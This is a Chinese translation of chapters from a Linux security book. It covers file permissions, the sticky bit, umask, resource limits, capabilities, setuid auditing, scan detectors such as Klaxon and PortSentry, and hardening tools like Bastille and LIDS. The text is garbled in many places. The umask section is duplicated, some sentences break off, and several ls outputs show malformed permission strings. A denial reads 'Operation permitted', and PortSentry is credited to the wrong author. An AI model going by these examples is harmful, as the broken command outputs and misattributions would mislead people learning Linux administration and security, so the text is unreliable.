要更改权限，让我们看：

```
jdoe@server1 ls -la a.txt
-rw-rw-r-- 1 jdoe jdoe 2
```

使用显式模式：

```
jdoe@server1 ls -la a.txt
-rw-rw-r-- 1 jdoe jdoe 2
```

注意权限`751`对应于`rwxr-x--`。看这个：

```
jdoe@server1 ls -la a.txt
-rw-rw-r-- 1 jdoe jdoe 2
```

这里`640`对应于`rw-r-----`。你也可以按如下方式使用符号模式`chmod`命令：

```
jdoe@server1 ls -la a.txt
-rw-r-- 1 jdoe jdoe 2
jdoe@server1 chmod +x a.txt
jdoe@server1 ls -la a.txt
-rwxr-x-- 1 jdoe jdoe 2
```

这里`chmod`使用了`+x`表示“添加执行权限”。当使用`+`字符时，表示添加权限，而`-`字符表示删除或移除权限。在这里，`+x`表示为所有者、组和世界添加执行权限。`chmod`命令也可以用于更改特定组的权限：

```
jdoe@server1 chmod g-r a.txt
jdoe@server1 ls -la a.txt
-rw--x--x 1 jdoe jdoe 2
```

这个示例显示`chmod`执行了`g-r`，意味着“移除组权限”。

### 粘滞位

如果用户对目录具有写入权限，该用户就可以删除目录中的文件和目录，即使这些文件不属于该用户，且权限设置为该用户无法读取或写入该文件：

```
jdoe@server1 ls -ld temp
drwxrwrt 2 jdoe      users      1024 Nov 29:15:03 temp
```

我们看到`temp`目录属于`jdoe`

```
student@server1 ls -1
total 0
--------- 1 jdoe      users            0 Nov 29 15:00 a
--rw-r--r-- 1 root      root               0 Nov 29 14:59 b
--rw-r--r-- 1 student   users            0 Nov 29 14:59 c
--rw-r--r-- 1 jdoe      users            0 Nov 29 14:59 d
student@server1 cat b
cat@server: b: Permission denied
student@server1 rm -f b
student@server1 ls -l
total 0
--------- 1 jdoe      users            0 Nov 29 15:00 a
--rw-r--r-- 1 student   users            0 Nov 29 14:59 c
```

注意，粘滞位通过其他执行权限位置的`t`来指示。现在设置了粘滞位后，其他用户无法删除他们不拥有的文件或目录：

```
student@server1$ ls -l
total 0
-rw------ 1 jdoe      users       0 Nov 29 15:00 a
-rw-rw-r-- 1 student jdoe       0 Nov 29 15:15 c
-rw-rw-r-- 1 jdoe      users       0 Nov 29 14:59 d
student@server1$ rm -f a
rm: cannot unlink 'a' Operation permitted
student@server1$ rm c
student@server1$ ls -l
total 0
-rw------ 1 jdoe      users       0 Nov 29 15:00 a
-rw-rw-r-- 1 jdoe      users       0 Nov 29 14:59 d
```

现在设置了粘滞位后，用户无法删除由`jdoe`拥有的文件，但`student`仍然可以删除他拥有的文件。设置了粘滞位的目录完美示例是`/tmp`，这是一个所有用户都可以用于临时文件和目录的存储器。所有用户都可以创建文件和目录，但用户只能删除他们拥有的文件和目录：

```
jdoe@server1$ ls -1d /tmp
drwxrxr-x 21 root              3072 Nov 29 13:41 /tmp
jdoe@server1$ touch a.txt
jdoe@server1$ mkdir directory_b
jdoe@server1$ ls -l
total 1
-rw-rw-r-- 1 jdoe      users       0 Nov 29 13:42 a.txt
drwxr-xr-x 2 jdoe      users      1024 Nov 29 13:43 directory_b
```

当用户创建文件或目录时，该文件或目录将被赋予默认权限：注意用户`jdoe`的默认权限为：

- 文件的`664`
- 目录的`775`

默认的文件和目录权限是根据用户的`umask`值设置的。`umask`值用于从最宽松的默认值中掩码位：文件为`666`，目录为`777`。

要显示你的`umask`值，请执行`umask`命令：

```
jdoe@server1$ umask
002
```

用户`jdoe`的`umask`值为`002`。确定`jdoe`在创建文件或目录时默认权限值的简单方法，只需从系统默认权限值减去`umask`即可：

| 文件: | 目录: | 777 |
|---|---|---|
| 002 | 002 | |
| 664 | 775 | |

要更改你的默认权限，请更改你的`umask`值。要创建最严格的权限，请使用`777`的`umask`值：

```
jdoe@server1$ umask 777
jdoe@server1$ touch c
jdoe@server1$ ls -1
total 1
-rw-r--r-- 1 jdoe users 0 Nov 29 13:42 a.txt
------ 1 jdoe users 0 Nov 29 14:22 c
drwxr-x 2 jdoe users 1024 Nov 29 14:31 directory_b
```

当然，这太严格了，因为`jdoe`对新文件没有读和写权限：

```
jdoe@server1$ cat c
cat: c: Permission denied
```

要创建具有最实实用性权限的文件和目录，请使用`077`的`umask`值：

```
jdoe@server1$ umask 077
jdoe@server1$ touch d
jdoe@server1$ mkdir directory_e
jdoe@server1$ ls -l
total 2
-rw-r--r-- 1 jdoe users 0 Nov 29 13:42 a.txt
------ 1 jdoe users 0 Nov 29 14:22 c
-rw------- 1 jdoe users 0 Nov 29 14:30 d
drwxr-x-x 2 jdoe users 1024 Nov 29 14:33 directory_b
drwx------ 2 jdoe users 1024 Nov 29 14:30 directory_e
```



注意 `077` 的 `umask` 值如何赋予 `jdoe` 对该文件的读/写权限，以及对 `directory_e` 的读/执行权限，但对组和其他用户没有权限。在登录时设置 `umask` 值，只需将以下命令添加到你的脚本中（`~/.bash_profile` 或类似文件）：

```
umask 077
```

### 文件权限的通用规则

通用规则是对文件设置最严格的限制，并根据需要为特定用户或组添加权限。添加权限很容易，但在不陷入拉锯战的情况下撤销权限非常困难。

### 文件属性

除了修改文件的权限外，用户还可以修改文件的属性。文件的属性通过 `chattr` 命令更改，并通过 `lsattr` 命令列出。属性只能用于某些文件系统。

| 属性 | 描述 |
|---|---|
| a | 只允许追加 |
| c | 必须被压缩 |
| d | 压缩 |
| i | 不可变，无法删除、修改或重命名 |
| s | 仅在删除时删除 |
| u | 不允许压缩 |

### 用户配额（Quotas）

要显示你的 `umask` 值，请执行 `umask` 命令：

```
jdoe@server1$ umask
002
```

用户 `jdoe` 的 `umask` 值为 `002`。确定 `jdoe` 在创建文件或目录时默认权限值的简单方法，只需从系统默认权限值减去 `umask` 即可：

| 文件: | 目录: | 777 |
|---|---|---|
| 002 | 002 | |
| 664 | 775 | |

要更改你的默认权限，请更改你的 `umask` 值。要创建最严格的权限，请使用 `777` 的 `umask` 值：

```
jdoe@server1$ umask 777
jdoe@server1$ touch c
jdoe@server1$ ls -1
total 1
-rw-r--r-- 1 jdoe users 0 Nov 29 13:42 a.txt
------ 1 jdoe users 0 Nov 29 14:22 c
drwxr-x 2 jdoe users 1024 Nov 29 14:31 directory_b
```

当然，这太严格了，因为 `jdoe` 对新文件没有读和写权限：

```
jdoe@server1$ cat c
cat: c: Permission denied
```

要创建具有最实实用性权限的文件和目录，请使用 `077` 的 `umask` 值：

```
jdoe@server1$ umask 077
jdoe@server1$ touch d
jdoe@server1$ mkdir directory_e
jdoe@server1$ ls -l
total 2
-rw-r--r-- 1 jdoe users 0 Nov 29 13:42 a.txt
------ 1 jdoe users 0 Nov 29 14:22 c
-rw------- 1 jdoe users 0 Nov 29 14:30 d
drwxr-x-x 2 jdoe users 1024 Nov 29 14:33 directory_b
drwx------ 2 jdoe users 1024 Nov 29 14:30 directory_e
```

注意 `077` 的 `umask` 值如何赋予 `jdoe` 对该文件的读/写权限，以及对 `directory_e` 的读/执行权限，但对组和其他用户没有权限。在登录时设置 `umask` 值，只需将以下命令添加到你的脚本中（`~/.bash_profile` 或类似文件）：

```
umask 077
```

# 第1 章：Linux 安全概览

```
jdoe@server$ ulimit -n 512
jdoe@server$ ulimit -a
core file size (blocks) 1000000
data seg size (kbytes) unlimited
```



# Limits 配置

`file size (blocks)` `unlimited`

`max memory size (kbytes)` `unlimited`

`stack size (kbytes)` `8192`

`cpu time (seconds)` `unlimited`

`max user processes` `2048`

`pipe size (512 bytes)` `512`

`open files`

`virtual memory (kbytes)` `2105343`

`limits.conf` 除了通过 `/etc/profile` 强制执行 `ulimit` 命令外，你还可以在 `/etc/security/limits.conf` 中定义限制。该文件允许你根据用户名或组成员身份对用户实施限制。该文件的格式为

`domain type item value`

其中 `domain`（域）可以是用户名、以 `@` 符号开头的组名，或者是匹配所有用户的星号（`*`）。`type`（类型）字段是硬（`hard`）或软（`soft`）。`item`（项目）字段是你想要限制的资源，例如 `cpu`、`nproc` 或 `maxlogins`。`value`（值）是为指定的项目设置的。

这是一个 `limits.conf` 示例：

```
@cpuhogs hard cpu 2
@programmers hard nproc 40
@users hard nproc 10
@clients soft maxlogins 5
@clients hard maxlogins 8
linus hard nproc 9999
linus hard cpu 9999
```

在这里，我们设置了限制以防止 CPU 占用者拖慢机器速度，允许程序员运行更多的进程，限制了同时登录的数量，并允许 linux 拥有比其他人高得限制。

## Linux 能力 (Capabilities)

Linux 正在向 POSIX 权限（`capabilities`）的概念转变。这种方法是一种为进程提供离散权限的机制，与传统的、全能的 root 机制不同。这允许进程以其执行特殊任务所需的精确权限集进行运行。

## 攻防 Linux 揭秘：Linux 安全秘密与解决方案

> 注意：在经历了十年的未能成功制定出基于权限的安全模型（POSIX 1003.1e）规范后，负责的委员会放弃了该草案。尽管 Linux 和其他系统正在实现能力功能，但他们并不期望这些功能在不同的 UNIX 类操作系统之间的处理方式完全相同。

可以给一个进程一组权限的完全控制权，使其能够传递给它运行的其他程序，或者你可以将这些权限仅限于该程序，而不包括其所有子进程。这意味着你可以为进程提供无法授予其他程序的权限，从而防止许多黑客欺骗程序以高特权执行 shell 代码（传统上运行 `/bin/sh`）的攻击。

例如，考虑一个需要绑定低位端口（<1024）的程序，这在传统上被除了 root 用户以外的所有用户所限制。如果你设置了 `CAP_BIND_SERVICE` 能力，它就被允许绑定低端口，但它不具备 root 拥有的其他访问权限，例如读写任何文件的能力。

使用能力允许你为用户和程序设置极其详细的权限，这可以极大增强安全性。如果你正在编写用户程序，我们强烈建议在程序开始时移除所有非必要的权限，以减少其被攻破时可能拥有的权力。

关于 Linux 能力的更多阅读，请参阅 `http://www.kernel.org/pub/linux/privs/kernel-2.2/capfaq-02.txt`。

## 其他安全控制

每个 Linux 系统都有各种安全控制措施，这些措施不需要单独放置在用户身上，而是由 Linux 内核本身自动执行。这些限制在其他 UNIX 类系统中也存在，但对于我们处于弱势的 Windows 兄弟来说可能是陌概念。

## 信号 (Signals)

在 Linux 中，用户可以向进程发送信号。信号是从一个进程发送到另一个进程的消息。发送给进程的常用信号是 `TERM`，或终止信号。该信号发送给进程以强制进程终止，通常用于杀死失控的进程。这个示例显示了用户杀死一个进程：

```
jdoe@server1$ kill -TERM 13958
```

该命令向进程 ID 为 `13958` 的进程发送 `TERM` 信号。这里是使用 `killall` 的示例：

```
root@server1# killall -HUP httpd
```



# 第1章：Linux 安全概览

此 `killall` 命令向所有名为 `httpd` 的进程发送信号（在此例中为 `HUP`，即挂起信号）。`HUP` 信号通常用于强制进程重新读取其配置文件，通常在程序配置更改后使用。

在 Linux 中，用户只能向他们拥有的进程发送信号。换句话说，用户 `jdoe` 无法杀死 `james` 拥有的进程。例外是 `root` 用户；`root` 可以向系统上的任何进程发送信号。当然，普通用户将无法杀死 `root` 拥有的进程，例如 `httpd` 和 `sendmail`。

## 特权端口 Privileged Ports

`root` 用户是唯一可以绑定到小于 `1024` 端口的用户（绑定端口意味着网络服务连接并开始在机器的某个端口上监听）。对此有两个主要原因，都与以下因素有关：

- 你可以信任来自远程机器小于 `1024` 端口（例如 `889`）的连接是由 `root` 运行的程序提供的。这在某些协议中用于身份验证。例如，`rsh` 和 `ssh` 可以配置为允许某些用户。

## 攻防 Linux 揭秘：Linux 安全秘密与解决方案

其他操作系统没有这种隔离机制。这意味着系统内存对所有进程都可用。

## 系统日志 System Logging

Linux 拥有一个标准的日志功能，非常易用，并可以插件到任何程序中。Linux 的这一功能强大且易于使用。你可以记录任何信息，操纵信息的格式，并将日志重定向到你选择的文件或进程。

日志信息通常写入文件，因此很容易搜索和解析（对于我们这些不喜欢使用困难且受限的 GUI 查看日志信息的人来说，这是一个好消息）。如果信息是文件，就可以很容易地编辑和搜索。`grep` 等简单工具可以在文件中定位特定文本，`perl` 等工具可以提取和转换。

## 虚拟内存管理

Linux 的内存管理系统内置安全性。每个进程在启动时都分配了自己的内存。除非经过设置，否则进程无法访问其他内存。另一个 Linux 内存管理安全功能是，任何消耗过多内存的进程会被杀死，而其他进程不受影响。由于内核回收了被杀死进程的内存，因此不会产生内存泄漏。

![](img/33829ffb1435b4baef56cd2c28ec6cd_52.png)

# 总结

黑客想要控制你的机器。如果你知道黑客尝试做什么以及你可以做什么，Linux 可以阻止他们的访问。

为了成功保护你的 Linux 机器免受攻击，你需要了解 Linux 操作系统提供的基本安全功能。某些功能在其他 UNIX 类系统中是通用的，例如用户、组、文件权限和进程资源。其他功能可能在其他系统中存在，但实现方式不同，例如扩展文件属性、配额和限制。某些功能在 UNIX 世界之外也有对应物，而即使是最简单的文件权限对于非多用户系统来说也是陌生的。

在后续章节中，我们将揭示黑客执行的安全攻击以及你可以主动采取的防御措施。为了充分理解这些攻击并能够充分地保护自己，理解本章讨论的基本概念至关重要。

# 第二章 主动措施与从入侵中恢复

## 揭秘 Linux 攻击：Linux 安全奥秘与解决方案

你可能会奇怪，为什么在我们还没有深入探讨黑客攻击之前，就开始讨论在入侵发生后该做什么了。在你的机器被攻破后，你可以采取许多步骤来驱逐入侵者并救援你的系统。然而，这些操作中的许多项要求你在攻击之前已经采取了某些措施。这些措施将为你在驱逐黑客后提供清理工作所需的信息。此外，通过学习清理措施，你能够更好地理解书中描述的黑客方法可能会留下什么样的痕迹。

在读完书的剩余部分后，我们建议你回来重读这一章，因为我们所讨论的很多内容将会变得更加清晰且更有用。

我们讨论的所有主动措施都假设你的机器尚未被入侵。如果你的系统已经被攻破，那么我们列出的工具可能会失效，你应该立即采取恢复步骤。请参阅第 10 章以了解黑客在获得 `root` 权限后可以做的某些恶性事情。

## 主动措施

你必须采取各种主动措施，既是为了保护你的系统，也是为了在发生入侵时更容易进行恢复。

### 漏洞扫描器

有许多安全扫描器可用于测试你自己的系统的安全性。这些程序也可以被黑客使用，因此确保这些工具不会报告你系统中的任何漏洞是非常关重要的。

多年来开发和使用的扫描系统在方法和能力上各不相同，因此使用几个扫描器进行扫描以获得可靠的采样结果是一个好主意。扫描器主要分为类：

**系统扫描器 System scanners**：设计为从本地主机运行，这些扫描器可以确定允许本地用户获得未经授权权限的漏洞。这些漏洞通常是糟糕的文件权限、不安全的配置或旧的软件版本。
- **网络扫描器 Network scanners**：网络扫描器检查任何网络可访问的漏洞，这些漏洞可能允许黑客进入你的机器，或收集可能辅助攻击尝试的信息。

### 系统安全扫描器

扫描器会告知你它发现的问题，通常会提供如何修复这些问题的建议，但不会尝试自动修复问题。这是一件好事。扫描器可能会产生误报 `false positive`，或者修复安全漏洞可能会导致系统不稳定。

遗憾的是，系统扫描器比网络扫描器少得多。开发者更倾向于编写能够防止黑客从网络进入你机器的扫描器——因为入口和漏洞容易定义得多。系统上的漏洞或潜在漏洞更难归类。一旦进入你的机器，黑客有多种方法提升他们的权限，试图编写一个扫描器来捕获所有他们是不可能的。

### 简单的 find 命令

检查系统你所做的最简单的事情之一是列出机器上设置了 `setuid` 和 `setgroup` 的程序（以下简称 "`setXid`"）。你会被它们的数量之多而感到大吃一舌。这些 `setXid` 程序通常是入侵的源头。如果你发现某个 `setXid` 程序提供了你不需要的功能，你应该删除它所属的包，或者直接删除该 `setXid`。

这里有一条简单的命令行命令，可以列出机器上所有带有 `setuid` 或 `setgroup` 位的文件：

```bash
machine# find / -perm -02000 -o -perm -04000 -ls
```

在最严格的环境下（这会极大地影响功能），你可以删除除 `/bin/su` 之外的所有已安装程序的 `setXid` 属性，以便你成为 `root`。这可能会导致许多投诉（例如，人们将无法更改自己的密码）；因此请根据发现的问题，并在问题出现时恢复相应的权限。

### COPS

计算机神谕与密码系统 Computer Oracle and Password System, http://www.fish.com/cops/ 是最早的安全扫描器之一。由于其年代久远，它不应作为你唯一的系统扫描器，但它是一个很好的起点。它是某些 Linux 发行版中仍然存在的（通常属于“泄露过多信息”类别）工具，从其 README 中可以看出：

> “所以，好运，希望你发现 COPS 有用”

COPS 具有检查 `setXid` 二进制文件和校验和；检查弱密码、不当的文件权限以及针对已知入侵迹象的检查。由于它的 PS，它是一个相当可扩展的工具，你可能希望为它添加自己的检查项。

### Tiger

Tiger `ftp://net.tamu.edu/pub/security/TAMU` 由德州 A&M 大学于 1993/94 年开发（并在 1999 年进行了更新以更好地支持 Linux）。为了让大学机器能够被外部访问，它必须通过 Tiger 测试。

Tiger 检查了 COPS 检查的大部分问题——密码文件、磁盘设备权限、NFS 导出目录、已知入侵迹象——此外还有电子邮件检查、别名扫描、端口验证和路径比较。它可以运行 `Crac` `Ale Muffet` 的密码破解程序来发现弱密码。

签名检查已经严重过时（针对 Linux 2.0.35 创建的各种二进制文件的校验和），因此如果你使用较新的 Linux 版本，将得到很多不匹配。

### Nabou

Nabou `http://www.nabou.org/`——以一部备受期待但令人失望的前传电影命名——是由 Thomas Linden 编写的 Perl 脚本，基于他发现的几个类似的脚本。它实际上是多个工具的结合。

它的主要用途是文件完整性检查。然而，与上述其他工具不同，Nabou 允许你加密存储校验和的数据库。这使得黑客难以修改条目以避免检测。任何作为 Perl 模块提供的加密库都可以工作，包括 `DES`、`IDEA`、`Blowfish` 和 `Twofish`。

> 如果你让它加密数据库，无法无法 `cron` 运行 Nabou，因为它必须向你询问密码。你可能希望运行两个版本以增加安全性——一个通过 `cron` 运行未加密的数据库，另一个由你频繁运行的加密数据库。

Nabou 还包含几个功能：

- 用户 ID 和有效用户 ID 不同。
- 组 ID 和有效组 ID 不同。

## 执行你自己的网络扫描

在第 3 章中我们将讨论黑客用于扫描你的机器以可用服务的各种方法和软件包。审计系统的一个关键部分是定期进行扫描，并检查你向世界开放了哪些服务。

首先，列出你机器上所有的网络接口。使用 `ifconfig` 命令可以轻松实现：

```bash
machine$ ifconfig -a
```



# 深度解析破解 Linux：Linux 安全秘密与解决方案

```
UP LOOPBACK RUNNING MTU:3924 Metric:1
RX packets:678 errors:0 dropped:0 overflows:0 frame:0
TX packets:678 errors:0 dropped:0 overflows:0 carrier:0
collisions:0 txqueued:0

ppp0 Link encap:Point-to-Point Protocol
inet addr:172.16.28.57 Mask:255.255.255.252
POINTPOINT NOARP MULTICAST MTU:1500 Metric:1
RX packets:5184 errors:0 dropped:0 overflows:0 frame:0
TX packets:6734 errors:0 dropped:0 overflows:0 carrier:0
collisions:0 txqueued:10
```

上述我们有一台拥有多个接口的机器：

- `eth0`: 以太网卡上的 IP 地址
- `eth0:0`: `eth0` 卡上的虚拟 IP 地址
- `ppp0`: PPP（调制调解调器）地址
- `lo`: 回环地址

在某些情况下（在安全配置中），某些服务可能仅在特定接口上可用。例如，你可能让 `IMAP` 仅在安全接口上监听，而 `SMTP` 则在所有接口上监听；或者你可能配置了 `ipchains`/`iptables` 只允许某些数据包通过。因此，针对所有可用地址运行网络扫描器非常重要，以便明确查看每个接口上哪些服务是可。

你可以（也应该）从本地机器运行测试，但这可能无法提供最准确的可用性映射。你的机器前方路由设备上可能存在防火墙或访问控制列表，你的主机本身也可能有 `ipchains`/`iptables` 配置。因此，你还应该从不同的接入点对你的主机进行扫描。合适的接入点包括外部 ISP 账户、工作场所、家庭拨号接入或朋友处。

> 如果通过网络或从非你所属的机器进行扫描，获得机器所有者的许可是一个非常明智的举意。解释你正在扫描的是自己的机器，而不是试图获取某些第三方的非法访问。提供尽可能的信息，包括扫描的时间、持续时间、源和目的地。在尝试扫描之前说明这些情况，总是比在事后向当局解释要好。根据墨菲定律，入侵检测系统可能不会帮助你判断机器是否正受到攻击，但当你只影响自己的机器时，系统无疑会抓到你。

# 第 2 章：主动防御措施与从入侵中恢复

你应该确保使用第 3 章列出的几种网络安全扫描器进行自己的扫描。不要仅依赖某一个，因为每种工具都有不同的优势。

## 扫描检测器

黑客在尝试入侵你的系统之前会做的第一件事是从网络对其进行扫描。如果你安装了软件让你在被扫描时获得通知，你就有了优势，可以准备好阻止黑客或在他们成功之前拔掉电源。扫描检测器是良好入侵检测系统（IDS）的一部分，允许扫描发生时发出通知。

你可以在 Linux 盒上运行多种检测器。每种检测器使用不同的方法来判断主机何时被扫描，且各自都有潜在的问题。建议查看几个检测器，看看哪种产品对你的环境具有最好的功能和方法论。

```
discard stream TCP root /path/to/klaxon klaxon discard

pop3 stream TCP now root /path/to/klaxon klaxon pop3

netbios-ns stream TCP now root /path/to/klaxon klaxon netbios-ns

imap2 stream TCP now root /path/to/klaxon klaxon imap2

rexec stream TCP now root /path/to/klaxon klaxon rsexec

login stream TCP now root /path/to/klaxon klaxon login

tftp stream UDP wait /path/to/klaxon klaxon tfftp
```



Klaxon (http://www.eng.auburn.edu/users/doug/second.html) 由 Doug Hughes 开发，是一个从 `inetd` 的简单检测器。你配置 `inetd` 监听你未使用的端口，在 `/etc/inetd.conf` 文件中写入如下条目：

然后，当建立到这些端口的任何连接时，Klaxon 将通过 `syslog` 记录连接并退出。如果支持，它还可以发出 `IDENT` 查询以发现远端的用户名。

遗憾的是，Klaxon 无法检测隐蔽（半开放）扫描；它仅在完整的 TCP 握手完成后才被 `inetd` 调用。如果握手未完成，连接最终会被丢弃，而 Klaxon 永远不会

> 警告：开启过多的 Klaxon 端口可能会让你面临拒绝服务攻击的风险，因为黑客可以多次击每个端口，`inetd` 将难以跟上。

## Courtney

Courtney (`ftp://ciac.linl.pub/ciac/secttools/unix/courtney/`) 的创建是为了直接响应第 3 章描述的网络扫描器 SATAN 的发布。Courtney 会监听扫描并通过 `syslog` 报告它们。它运行数据包嗅探器（`tcpdump`）并统计远程主机生成的连接数。如果数量超过阈值，Courtney 认为该机器正在进行扫描。

尽管考虑到 SATAN，Courtney 应该能发现任何向服务器发送大量请求以进行高效扫描的标准扫描器。然而，越来越多的扫描器具有以各种速度扫描的能力，包括极度偏执的模式，这种模式会缓慢探测端口，而 Courtney 不会将其视为威胁。

考虑到 SATAN，Courtney 应该能发现任何向服务器发送大量请求以进行高效扫描的标准扫描器。然而，越来越多的扫描器具有以各种速度扫描的能力，包括极度偏执的模式，这种模式会缓慢探测端口，而 Courtney 不会将其视为威胁。

## Scan

由 Solar Designer 创建的 PortSentry (`http://openwall.com/portsentry/`) 是一个

> 注意：自动拒绝主机可能会使你的机器容易受到拒绝服务攻击。攻击者可以伪造数据包使其来自其他机器，而你的扫描检测器会拒绝访问。如果攻击者伪装成你想要通信的机器（例如日志主机、DNS 服务器或安全服务器），你失去与这些机器的连接。

作为 Psionic Abacus 项目的一部分，PortSentry (`part of Psionic Abacus/`) 不仅允许你检测扫描，还可以对源采取行动。它可以检测正常和隐蔽扫描，并监控多 64 个端口，这完全足够。

当检测到端口扫描时，PortSentry 可以通过以下任何方式响应：

- 通过 `syslog` 记录日志。
- 在 `/etc/hosts.deny` 文件中添加条目以拒绝来自该主机的连接。
- 在系统中添加本地路由，使机器无法与攻击者通信，从而有效拦截返回流量。
- 重配置本地端口过滤器以拒绝来自攻击者的访问。

# 攻防 Linux 详解：Linux 安全秘密与解决方案

高级 TCP/UDP 隐身检测模式是最强大的，因为它们会立即识别任何不受支持的流量。然而，这也增加了更多误报的可能性。PortSentry 的设计初衷是注意到当连接到临时绑定的端口时并忽略它。这种行为在 FTP 中很常见，例如，它会临时打开高号端口以供数据传输的入站访问。如果 PortSentry 没有设计为识别这种行为，它最终将对所有有效数据包采取行动。

> 注意：`ident/auth` 端口 (`113/TCP`) 当你连接到某台机器时，该机器经常访问它以确定你的用户名（参见 RFC-931）。如果你在自己的机器上没有运行 `ident` 服务，应该显式告诉 PortSentry 忽略它。机器查询此端口是常见现象，如果你屏蔽了连接到此端口的主机，你就会屏蔽掉你正想要连接的那些机器。

在 PortSentry 配置文件，你可以列出要监控的端口、在触发响应之前允许多少个连接、要忽略的主机（它们不会触发 IP 封锁），并配置你希望用于阻止违规主机的任何方式（如果有）。此外，你可以在机器被黑洞之前执行任何自定义脚本。

PortSentry 是一个强大且易于使用的工具，你可以快速部署并运行。

## 加固你的系统

在一个完美的世界里，每个发布（或下载）的操作系统都应该是完美安全的。现实中，软件发行者必须决定如何在所需功能、性能、实用性与安全性之间取得平衡。安全性往往处于列表的末尾。

系统可能默认开启许多服务，尽管它们可能并不需要——例如，`helsetd` root 程序允许普通用户更轻松地控制系统——或者在可以使用更严格的权限不会移除所需功能但会减慢攻击者速度的情况下的文件权限。

加固是通过修复过度宽松的操作系统默认设置来使系统更安全的过程。我们将介绍一些经过充分测试程序，它们将帮助你加固系统，包括极大增强安全性的内核补丁。

### Bastille

最初，Bastille 项目 (`http://bastille-linux.sourceforge.net/`) 旨在创建一个新的、更安全的 Linux 发行版。事实证明这比开发人员希望的要困难且耗时得多，因此他们转了方向，改为创建一组模块来加固新安装的 Red Hat 发行版。

Bastille 最近再次更改了方法论。以前你必须在安装 Red Hat 之后立即运行 Bastille，而现在你可以使用 Bastille 在任何时候加固系统。这需要大量的重写工作来正确处理“非原始”系统，但这是非常值得的。Bastille 正在编写以处理更多发行版（如 Red Hat 和 Mandrake），尽管它在任何基于 Red Hat 的系统上都应该运行得很好。

Bastille 由一系列文本菜单驱动，如图 2-1 所示。每个菜单都描述了一个它认为不安全或可疑的情况，并询问你是否要对其进行加固。如果你熟悉提到的这些项目——在你读到这本书时你应该已经熟悉了——大约需要 10 分钟即可回答完问题并让 Bastille 为你的系统进行加固。

要加固你的系统，首先下载 Bastille 源码并将其解压到 `/root` 目录，然后以 root 身份运行 `InteractiveBastille.pl` 脚本。在回答问题后，程序将进行更改。

配置工具在配置完成后保存一个名为 `BackEnd.pl` 的文件。如果你想用相同的配置加固额外的服务器，不必运行交互式菜单，而是可以将此 `BackEnd.pl` 文件复制到新服务器并运行 `AutomatedBastille.pl`。这样该机器将应用了相同的加固规则。

运行 Bastille 是一个快速且简单的过程，也是任何安全系统的必备之路。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_64_0.png)

**图 2-1.** 使用交互式 Bastille 脚本加固你的系统

### Openwall Linux 补丁

Solar Designer 为 Linux 内核创建了一个补丁 (`http://www.open.com/linux/`)，增加了几个安全相关的功能和修复。你必须重新编译并安装带有补丁的新 Linux 内核才能使新功能可用。包含以下功能（这不是一个完整的列表）。

- 不可执行栈：缓冲区溢出传统上通过修改栈区域导致特权程序执行任意（黑客提供的）代码。此补丁通过将栈区域设为不可执行，使得大多数此类溢出失效。
- `/tmp` 中的受限链接：`/tmp` 目录中的恶意链接经常被用作安全违规的一部分。此补丁防止了 `/tmp` 中某些类型的链接。遗憾的是，可能会破坏某些依赖这些链接的软件。
- `/tmp` 中的受限 FIFO：通常情况下，`/tmp` 中的 FIFO 可将数据从一个用户重定向到另一个用户。补丁阻止了此功能。
- Proc 文件系统权限：更改了 `/proc` 文件系统的权限，使用户除非在特殊组中否则无法看到其他用户的进程信息。
- 文件描述符 0, 1, 2 处理：文件描述符 0、1 和 2（通常为 `stdin`、`stdout` 和 `stderr`）对于 `setuserid` 或 `setgroupid` 二进制文件始终打开。如果程序调用其中一个，该文件描述符会自动连接到 `/dev/null`。

这些内核补丁在某些情况下与标准 Linux 100% 兼容；在决定使用它们之前，确保你理解其影响。

### LIDS

Linux 入侵检测系统 (`http://www.linux.org/`) 的意义远大于其名称。LIDS 在内核中包含端口检测器和安全警报。LIDS 以内核补丁的形式出现，它极大地扩展了 Linux 安全模型。

- 高级文件保护：受 LIDS 保护的文件可以隐藏，或防止 root 用户修改。
- 进程保护：内核可以拒绝向受保护进程发送信号（如 `SIGKILL`）。进程也可以从视图（proc）中完全隐藏。
- 更细粒度的访问控制：可以更有效地使用能力（Capabilities）授予权限，不允许 root 修改。
- 内置端口扫描检测：内置内核的端口扫描器可以检测到 Nmap、SATAN 等工具目前常用的扫描（如半开放扫描、SYN 隐身端口扫描、FIN、Xmas 等）。违规行为根据需要通过 `syslog` 或电子邮件记录。

要安装 LIDS，你必须下载最新的 Linux 内核和 LIDS 源码。然后用 lids 补丁修补内核源码，重新编译内核、安装并重启。LIDS 在运行时会保护内核免受修改，除非使用 root 身份并使用 lids 进行身份验证。你任何希望持久化的更改都存储在 `/etc/lids` 目录。

LIDS 应该配置为对所有文件允许非常严格的权限。你应该保护所有的二进制文件（`/bin`、`/usr/bin`、`/sbin` 等）、日志文件（`/var/log`）和配置文件（`/etc`）。LIDS 允许四种不同的文件访问控制：

- 拒绝（Deny）：标记为 DENY 的文件对任何用户或程序不可，除非显式允许。例如，你可以拒绝访问 `/etc/shadow` 文件，并显式允许 `/bin/login` 程序访问它以进行身份验证。
- 只读（Read）：只读文件（READ）不允许包括 root 在内的任何人修改。
- 仅追加（Append）：仅追加文件（APPEND）只允许追加数据。现有数据无法更改。这通常用于日志文件，允许其增长，但可以防止攻击者删除指示其行为的行记录。
- 写入（Write）：此选项允许为标准安装或程序授予文件写入权限。

# Linux 攻破解：Linux 安全秘密与解决方案

## 日志文件分析

UNIX 拥有最简单且实用的日志系统之一。在生成日志文件时，程序有两个主要选项：

- 进程管理的日志文件：某些程序处理自己的日志记录。这意味着它们的日志文件包含该源的输出。日志文件通常由命令行参数或配置文件决定，或者硬编码在程序中。例如，Apache Web 服务器有一个访问日志文件（包含请求的 URL）以及一个错误日志文件（列出了经历过的缺失页面、无效的 CGI 响应等）。
- Syslog 消息：程序记录信息的最常见方式是通过 `syslog` 守护进程（daemon）。该程序的唯一目的是为不同的程序提供一种通用的日志记录方法。Syslog 决定如何处理这两项内容——syslog 设施（facility）和日志级别（level）。

每个写入自己日志文件的程序实现方式各不相同，因此我们不再详细讨论它们。但是，由于许多程序使用 `syslog`，我们将对其进行更全面的介绍。

### Syslogd 配置

所有 `syslog` 消息都带有特定的设施（facility）和级别（level）。`/etc/syslog.conf` 文件允许根据这两个选项指定消息的去向。

Syslog 设施：Syslog 设施仅仅是让程序描述其所属日志组的一种方式。可用的设施有：

| Syslog 设施 | 描述 |
|---|---|
| auth | 安全/授权消息（已弃用） |
| authpriv | 安全/授权消息 |
| cron | Cron 和 at 任务 |
| daemon | 其他系统守护进程 (sshd, inetd, pppd 等) |
| kern | 内内核消息 |
| lpr | 行打印机子系统 |
| mail | 邮件子系统 (sendmail, postfix, qmail 等) |
